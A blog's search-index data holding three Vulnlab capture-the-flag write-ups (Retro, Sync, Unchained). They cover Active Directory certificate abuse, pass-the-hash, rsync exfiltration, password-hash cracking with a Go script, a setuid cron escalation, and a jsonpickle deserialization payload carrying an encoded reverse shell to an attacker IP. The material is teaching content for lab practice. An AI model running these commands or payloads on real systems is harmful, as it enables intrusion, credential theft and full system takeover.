Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\trainee:trainee SMB 10.10.64.243 445 DC [*] Enumerated shares SMB 10.10.64.243 445 DC Share Permissions Remark SMB 10.10.64.243 445 DC ----- ----------- ------ SMB 10.10.64.243 445 DC ADMIN$ Remote Admin SMB 10.10.64.243 445 DC C$ Default share SMB 10.10.64.243 445 DC IPC$ READ Remote IPC SMB 10.10.64.243 445 DC NETLOGON READ Logon server share SMB 10.10.64.243 445 DC Notes READ SMB 10.10.64.243 445 DC SYSVOL READ Logon server share SMB 10.10.64.243 445 DC Trainees READ syl@sylsec:~/vulnlab/Retro$ smbclient //retro.vl/Notes -U \u0026#39;trainee\u0026#39; Password for [WORKGROUP\\trainee]: trainee Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Jul 24 01:03:16 2023 .. DHS 0 Wed Jul 26 12:54:14 2023 ToDo.txt A 248 Mon Jul 24 01:05:56 2023 6261499 blocks of size 4096. 2179053 blocks available smb: \\\u0026gt; get Todo.txt getting file \\Todo.txt of size 248 as Todo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec) I got a file Todo.txt lets take a look:\nThomas, after convincing the finance department to get rid of their ancienct banking software it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me. Best James This text file hints that there is some ancient banking software and some pre-created computer account, judging by that I can safely assume that they are talking about the account BANKING$, I tried onec again some weak credentials like $BANKING:banking and I got this result:\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u BANKING$ -p \u0026#39;banking\u0026#39; SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [-] retro.vl\\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT The result I got is STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT which means that the password is correct! (REF: https://trustedsec.com/blog/diving-into-pre-created-computer-accounts ) But I cannot use this account until the password is changed, so lets do that. There is changepasswd.py by Impacket (https://github.com/fortra/impacket/blob/master/examples/changepasswd.py ) which I can use to change the password via RPC, the thing that I need is another user, which I already have (trainee). There are other methods to change the password like kpasswd as well.\nChange the password via RPC (imapcket\u0026rsquo;s changepasswd.py) Method #1 (impacket-env) syl@sylsec:~/tools/impacket/examples$ python changepasswd.py retro.vl/\u0026#39;BANKING$\u0026#39;:\u0026#39;banking\u0026#39;@10.10.64.243 -altuser trainee -altpass trainee Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra New password: Retype new password: Summer2018! [!] Attempting to *change* the password of retro.vl/BANKING$ as retro.vl/trainee. You may want to use \u0026#39;-reset\u0026#39; to *reset* the password of the target. [*] Changing the password of retro.vl\\BANKING$ [*] Connecting to DCE/RPC as retro.vl\\trainee [*] Password was changed successfully. Using kpasswd Method #2 I can go with the LDAP way of chaning the password using the binary kpasswd and since this is uncommon on Linux you can install it with:\nsyl@sylsec:~/tools/$ sudo apt install krb5-user Then you have to edit the realms in the /etc/krb5.conf\n[libdefaults] default_realm = RETRO.VL dns_lookup_realm = false ticket_lifetime = 24h renew_lifetime = 7d rdns = false kdc_timesync = 1 ccache_type = 4 forwardable = true proxiable = true [realms] RETRO.VL = { kdc = DC.RETRO.VL admin_server = DC.RETRO.VL } [domain_realm] .retro.vl = RETRO.VL And then simply invoke kpasswd\nsyl@sylsec:~/vulnlab/Retro$ sudo kpasswd BANKING$ Password for BANKING$@RETRO.VL: Enter new password: Enter it again: Password changed. And now we can use this account!\nLets enumerate the ADCS (Active Directory Certificate Services). I used certipy for that matter.\nsyl@sylsec:~/vulnlab/Retro$ certipy find -u trainee -p \u0026#39;trainee\u0026#39; -dc-ip 10.10.113.62 -vulnerable Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;retro-DC-CA\u0026#39; via RRP [*] Got CA configuration for \u0026#39;retro-DC-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20231219202428_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20231219202428_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20231219202428_Certipy.json\u0026#39; Looking at the 20231219202428_Certipy.txt we can see a ESC1 vunlerability related to the RetroClients certificate.\nMore about ESC1\nLooking at the permissions of the certificate template we notice that it can be used only by:\nRETRO.VL\\Domain Admins RETRO.VL\\Enterprise Admins RETRO.VL\\Domain Computers I believe that the user BANKING$ is within those groups so lets see:\nsyl@sylsec:~/vulnlab/Retro$ bloodhoundpy -dc retro.vl -u trainee -p trainee -d retro.vl WARNING: Could not find a global catalog server, assuming the primary DC has this role If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc INFO: Getting TGT for user INFO: Connecting to LDAP server: retro.vl INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 2 computers INFO: Found 7 users INFO: Connecting to LDAP server: retro.vl INFO: Kerberos auth to LDAP failed, trying NTLM INFO: Found 53 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: INFO: Querying computer: DC.retro.vl INFO: Done in 00M 04S Then I can query the user BANKING$ and I can see its First Degree Group Membership that this user is part of the group DOMAIN COMPUTERS, so we can use that user to exploit the certificate and retrieve the NTLM hash of the administrator.\nLets retrieve the private key:\nsyl@sylsec:~/vulnlab/Retro$ certipy req -u \u0026#39;BANKING$\u0026#39; -p \u0026#39;Summer2018!\u0026#39; -dc-ip \u0026#39;10.10.64.243\u0026#39; -target \u0026#39;dc.retro.vl\u0026#39; -ca \u0026#39;retro-DC-CA\u0026#39; -template \u0026#39;RetroClients\u0026#39; -upn \u0026#39;administrator\u0026#39; -key-size 4096 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [*] Successfully requested certificate [*] Request ID is 13 [*] Got certificate with UPN \u0026#39;administrator\u0026#39; [*] Certificate has no object SID [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; UnPAC the hash Method #1 We can use the technique UnPAC the hash to get the NTLM hash using the PKINITtools.\nFirst we need to retrieve the TGT and the AS-REP encryption key.\nsyl@sylsec:~/vulnlab/Retro/temp$ gettgtpkinit -cert-pfx ../exfiltrated/administrator.pfx -dc-ip 10.10.113.62 retro.vl/administrator ../exfiltrated/administrator.ccache 2023-12-19 20:53:00,328 minikerberos INFO Loading certificate and key from file INFO:minikerberos:Loading certificate and key from file 2023-12-19 20:53:00,802 minikerberos INFO Requesting TGT INFO:minikerberos:Requesting TGT 2023-12-19 20:53:00,889 minikerberos INFO AS-REP encryption key (you might need this later): INFO:minikerberos:AS-REP encryption key (you might need this later): 2023-12-19 20:53:00,889 minikerberos INFO 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec INFO:minikerberos:23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec 2023-12-19 20:53:00,895 minikerberos INFO Saved TGT to file INFO:minikerberos:Saved TGT to file Then we can use the getnthash.py to retrieve the NTLM hash.\nsyl@sylsec:~/vulnlab/Retro/exfiltrated$ getnthash retro.vl/administrator -key 23f920ec14a57021c38d9c8c806ce53929774cf8a79d23049587624d2b7378ec Impacket v0.11.0 - Copyright 2023 Fortra [*] Using TGT from cache [*] Requesting ticket to self with PAC Recovered NT Hash 25....\u0026lt;hash\u0026gt; Using Certipy Method #2 syl@sylsec:~/vulnlab/Retro$ certipy auth -pfx ./exfiltrated/administrator.pfx -dc-ip \u0026#39;10.10.64.243\u0026#39; -username \u0026#39;administrator\u0026#39; -domain retro.vl Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@retro.vl [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@retro.vl\u0026#39;: aad3b435b51404eeaad3b435b51404ee:25\u0026lt;hash\u0026gt; Then we can use that that hash for PTH (Pass the hash) attack.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u administrator -H 25\u0026lt;hash\u0026gt; -x \u0026#34;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#34; SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\administrator:25\u0026lt;hash\u0026gt; (Pwn3d!) SMB 10.10.64.243 445 DC [+] Executed command via wmiexec SMB 10.10.64.243 445 DC VL{\u0026lt;hash\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-19-vulnlab-retro\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-24-vulnlab-sync\/": {
        "title": "Vulnlab - Sync [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Sync Linux (Ubuntu) Easy Summary We would find a TCP port 873 open that is related to the rsync utility, which we can connect to. Upon connecting, we would find folders related to the http server that is running. After the exfiltration of those files, we would find a SQLite3 database which contains several hashes of some users. The hashes are constructed a bit odd so we would create a simple utility in Go to help us bruteforce the hash, then we would use the FTP with the found credentials to put our public SSH key so that we can log in with SSH. Then we would find a folder related to some backups of the machine, we will exfiltrate those files, and we are going to try to crack the newly found credentials. Then we would be able to switch users again, and we are going to enumerate once more to find a running CRON job that we would use to gain the root access of the machine.\nExploitation / Initial Foothold We would start with a nmap scan that would scan TCP and UDP ports.\nsyl@sylsec:~/vulnlab/Sync$ sudo nmap -sS -sU 10.10.64.96 --min-rate 10000 --open Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-25 11:16 EET Nmap scan report for 10.10.64.96 Host is up (0.052s latency). Not shown: 1002 closed ports, 994 open|filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 873/tcp open rsync We find that the machine runs the utility rsync, which is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files.\nWe can connect to it by using it directly from our linux environment:\nsyl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/ httpd web backup syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/httpd receiving incremental file list drwxr-xr-x 4.096 2023/04/20 22:50:04 . drwxr-xr-x 4.096 2023/04/20 23:13:22 db -rw-r--r-- 12.288 2023/04/20 22:50:42 db/site.db drwxr-xr-x 4.096 2023/04/20 22:50:50 migrate drwxr-xr-x 4.096 2023/04/20 23:13:15 www -rw-r--r-- 1.722 2023/04/20 23:02:54 www/dashboard.php -rw-r--r-- 2.315 2023/04/20 23:09:10 www/index.php -rw-r--r-- 101 2023/04/20 23:03:08 www/logout.php sent 23 bytes received 228 bytes 167,33 bytes/sec total size is 16.426 speedup is 65,44 We would see that there is an interesting file httpd/db/site.db which may contain some credentials, so let\u0026rsquo;s get that file along with the other files.\nsyl@sylsec:~/vulnlab/Sync$ rsync -chavzP --stats rsync://10.10.64.96/httpd/ ./exfiltrated/ receiving incremental file list ./ db/ db/site.db 12,29K 100% 11,72MB/s 0:00:00 (xfr#1, to-chk=3/8) migrate/ www/ www/dashboard.php 1,72K 100% 1,64MB/s 0:00:00 (xfr#2, to-chk=2/8) www/index.php 2,31K 100% 2,21MB/s 0:00:00 (xfr#3, to-chk=1/8) www/logout.php 101 100% 98,63kB/s 0:00:00 (xfr#4, to-chk=0/8) Number of files: 8 (reg: 4, dir: 4) Number of created files: 7 (reg: 4, dir: 3) Number of deleted files: 0 Number of regular files transferred: 4 Total file size: 16,43K bytes Total transferred file size: 16,43K bytes Literal data: 16,43K bytes Matched data: 0 bytes File list size: 278 File list generation time: 0,001 seconds File list transfer time: 0,000 seconds Total bytes sent: 119 Total bytes received: 2,25K sent 119 bytes received 2,25K bytes 1,58K bytes/sec total size is 16,43K speedup is 6,95 Now, let\u0026rsquo;s run sqlite3.\nsyl@sylsec:~/vulnlab/Sync$ sqlite3 ./exfiltrated/db/site.db SQLite version 3.37.2 2022-01-06 13:25:41 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .tables users sqlite\u0026gt; select * from users; 1|admin|76\u0026lt;REDACTED\u0026gt; 2|triss|a0\u0026lt;REDACTED\u0026gt; sqlite\u0026gt; We would gather those users and hashes that we need to crack. Initially, I ran those md5 hashes through the rockyou.txt list, but they didn\u0026rsquo;t match anything, so I was curious why and went to look at the source code.\nIn the file index.php located in the www folder, we would find the following code snippet:\n\u0026lt;?php session_start(); $secure = \u0026#34;6c4972f3717a5e881e282ad3105de01e\u0026#34;; if (isset($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $hash = md5(\u0026#34;$secure|$username|$password\u0026#34;); $db = new SQLite3(\u0026#39;../db/site.db\u0026#39;); $result = $db-\u0026gt;query(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;$username\u0026#39; AND password= \u0026#39;$hash\u0026#39;\u0026#34;); $row = $result-\u0026gt;fetchArray(SQLITE3_ASSOC); if ($row) { $_SESSION[\u0026#39;username\u0026#39;] = $row[\u0026#39;username\u0026#39;]; header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } else { $error_message = \u0026#39;Invalid username or password.\u0026#39;; } } ?\u0026gt; We can see that the hash is being created by the value of the variable $secure the username and the password divided by a pipe.\nI cracked those hashes with my own solution written in Go, however there might be an easier way of doing that with hashcat or other hash cracking tool.\nHere is the Go code that we can use.\npackage main import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;sync\u0026#34; ) func main() { targetHash := \u0026#34;76\u0026lt;redacted\u0026gt;\u0026#34; filename := \u0026#34;/home/syl/tools/lists/rockyou.txt\u0026#34; file, err := os.Open(filename) if err != nil { panic(err) } defer file.Close() var wg sync.WaitGroup scanner := bufio.NewScanner(file) for scanner.Scan() { wg.Add(1) go func(line string) { defer wg.Done() hashedLine := hashLine(line) if hashedLine == targetHash { fmt.Printf(\u0026#34;Match found: %s\\n\u0026#34;, line) os.Exit(0) } }(scanner.Text()) } if err := scanner.Err(); err != nil { panic(err) } wg.Wait() } func hashLine(line string) string { data := []byte(\u0026#34;6c4972f3717a5e881e282ad3105de01e|admin|\u0026#34; + line) hash := md5.Sum(data) return hex.EncodeToString(hash[:]) } We can adjust the code for each user. Within seconds of running the code, we would get a match for the triss user.\nsyl@sylsec:~/vulnlab/Sync$ go run ./scripts/custom_crack.go Match found: g...\u0026lt;redacted\u0026gt; The hash of the admin wasn\u0026rsquo;t found.\nThose credentials were valid of the FTP service, and It seemed like that we are in the home directory of that user.\nWe can try to ssh with that user, but the SSH login isn\u0026rsquo;t permitted, so we can create an SSH folder .ssh from the FTP, and we can put our public SSH key into a file named authorized_keys then we would be able to connect using our public key!\nSwitching the user and Privilege Escalation We can find more users within the /etc/passwd file.\njennifer sa triss ubuntu Upon listing the directories, we would find a folder called backup which sits in the root of the file system. In that folder there are many zip files related to some kind of backup.\nWe can exfiltrate all the files and extract them to see what\u0026rsquo;s inside.\n# After the exfiltration find . -name \u0026#39;*.zip\u0026#39; -exec sh -c \u0026#39;unzip -d \u0026#34;${1%.*}\u0026#34; \u0026#34;$1\u0026#34;\u0026#39; _ {} \\; That bash one-liner would extract each zip file in its own directory.\nWe would find that those folders are mostly the same and the name of the file is a timestamp, in my specific case here are a couple of files:\n1703495041.zip -\u0026gt; Monday, December 25, 2023 9:04:01 AM 1703495161.zip -\u0026gt; Monday, December 25, 2023 9:06:01 AM 1703495281.zip -\u0026gt; Monday, December 25, 2023 9:08:01 AM We can see a pattern here, those zip files are being created every 2 minutes. We would note that and come back for it later on.\nUpon unzipping those files, we would find the following structure:\n|-- httpd | |-- db | | `-- site.db | |-- migrate | `-- www | |-- dashboard.php | |-- index.php | `-- logout.php |-- passwd |-- rsyncd.conf `-- shadow We can inspect the passwd and the shadow files, since that they are the ones that stand out at first. And having those files, we can use the utility from john called unshadow to combine the shadow and the passwd file into a single file that we can use to crack the passwords for the users.\nTo install the tool unshadow we would need to install john\n$ sudo apt install john -y unshadow ./exfiltrated/ssh/backup/1703494921/tmp/backup/passwd ./exfiltrated/ssh/backup/1703494921/tmp/backup/shadow \u0026gt; tmp_shadow Then we can crack it (or can we?):\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --wordlist=/home/syl/tools/lists/rockyou.txt No password hashes loaded (see FAQ) We cannot load those hashes in john with the default arguments because the hash function that is being used is called yescrypt. We can conclude the hashing function by inspecting the hashes that we in the tmp_shadow file.\n$y$j9T$DBxmxcNWJlhvgfWCUTbEC0\u0026lt;redacted\u0026gt; $y$j9T$jJFOBCaiGJUmyZZRFn5aG1\u0026lt;redacted\u0026gt; ... We have the starting sequence $y$ which is related to yescrypt. If you need more information about it, you can read this! We can use the argument --fromat=crypt\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --format=crypt Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:51 0% 2/3 0g/s 87.90p/s 119.4c/s 119.4C/s leslie..boston \u0026lt;redacted\u0026gt; (jennifer) \u0026lt;redacted\u0026gt; (triss) \u0026lt;redacted\u0026gt; (sa) Now we have the passwords for the user jennifer and the user sa. Upon changing the user to jennifer we would find the user.txt hash.\nWe can not run linpeas for further enumeration on both accounts sa,jennifer and we would find that we own a file called /usr/local/bin/backup.sh. Upon inspecting the file, we would see that the file contains a script that is being used to back up the files that we saw earlier (the zipped backups).\nUsing pspy we can monitor the currently running process by all users, and we would see that a backup is being created every 2 minutes (just like the timestamps we saw earlier).\nWe can edit the script, and we can add the line chmod u+s /bin/bash to the end of it. After 2 minutes, we can see if it works by invoking /bin/bash -p, that would give us the root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-24-vulnlab-sync\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-02-29-vulnlab-unchained\/": {
        "title": "Vulnlab - Unchained [Medium]",
        "tags": [],
        "content": "We can first mount the exposed NFS folder called backup to local folder called mounted.\nsudo mount -t nfs -o nfsvers=3 10.10.89.250:/var/nfs/backup ./mounted -o nolock We can see the source code is a project that is a result from this course:\nhttps://www.udemy.com/course/build-your-own-proof-of-stake-blockchain Upon reviewing the code that we got from the mount, we can see that the /transaction path that tries to decode the value of the transaction\nThen it goes into the BlockchainUtils.decode which has the following code:\nIt is notable that the jsonpickle direct decoding can be vulnerable to deserialization, so I\u0026rsquo;ve crafted the following payload:\n{\r\u0026#34;transaction\u0026#34;: \u0026#34;{\\\u0026#34;py\\/object\\\u0026#34;: \\\u0026#34;__main__.Transaction\\\u0026#34;, \\\u0026#34;syl\\\u0026#34;: {\\\u0026#34;py\\/reduce\\\u0026#34;: [{\\\u0026#34;py\\/type\\\u0026#34;: \\\u0026#34;subprocess.Popen\\\u0026#34;}, {\\\u0026#34;py\\/tuple\\\u0026#34;: [{\\\u0026#34;py\\/tuple\\\u0026#34;: [\\\u0026#34;python3\\\u0026#34;, \\\u0026#34;-c\\\u0026#34;, \\\u0026#34;import base64;exec(base64.b64decode(\u0026#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguMC4xMDciLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIik=\u0026#39;))\\\u0026#34;]}]}]}}\u0026#34;\r} I did this payload from scratch, but I found an article that has much more efficient payload here:\nhttps://medium.com/@0xbughunter/de-serialization-sometimes-pickle-can-be-too-sour-45c930e18b8e Nonetheless we can see that we got a connection back.\nAfter that and after a bit of enumeration we can see that snap is in the user folder which kind-a hints that. The vulnerability is CVE-2021-44731, we can find a PoC on GitHub, after that we are root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-02-29-vulnlab-unchained\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

